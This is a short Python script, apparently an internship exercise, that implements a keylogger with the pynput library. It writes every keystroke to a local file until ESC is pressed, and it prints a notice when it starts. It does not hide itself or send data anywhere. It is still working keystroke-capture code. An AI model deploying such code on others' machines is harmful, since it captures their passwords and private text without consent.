# PRODIGY_CS_04
from pynput import keyboard

# File where logs will be stored
log_file = "key_log.txt"

def on_press(key):
    """Handles key press events and logs them to a file."""
    try:
        with open(log_file, "a") as f:
            # Check if the key has a character value
            if hasattr(key, 'char') and key.char is not None:
                f.write(key.char)
            else:
                f.write(f'[{key}]')  # Log special keys like Enter, Shift, etc.
    except Exception as e:
        print(f"Error: {e}")

def on_release(key):
    """Stops the listener if the escape key is pressed."""
    if key == keyboard.Key.esc:
        # Stop the listener
        return False

# Display an educational message for ethical awareness
print("Keylogger started. Press 'ESC' to stop recording keystrokes.")

# Start the keyboard listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
